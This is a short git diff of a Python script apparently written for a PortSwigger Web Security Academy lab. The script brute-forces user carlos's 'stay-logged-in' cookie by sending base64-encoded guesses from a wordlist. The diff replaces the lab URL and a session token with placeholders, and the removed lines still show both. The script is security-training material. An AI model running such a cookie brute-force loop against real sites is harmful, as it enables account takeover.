@@ -11,7 +11,7 @@ import requests
 #encrypting cookie
 #b64 = base64.b64encode(combo.encode()).decode()
 
-url = "https://0af100d804fd3dc080466c8e00cd0030.web-security-academy.net/my-account?id=carlos"
+url = "[URL]/my-account?id=carlos"
 username = "carlos"
 
 #import os
@@ -32,7 +32,7 @@ with open("portswigger_Labs_corr/auth/wordlistCookie.txt", "r") as f:
 
         cookies = {
             "stay-logged-in": b64_cookie,
-            "session": "amIkTBLhMrlOKwcqU9rHRqLpZRS9EE95"  # Keep your session valid
+            "session": "[UR SESSION]"  # Keep your session valid
         }
 
         response = requests.get(url, cookies=cookies)
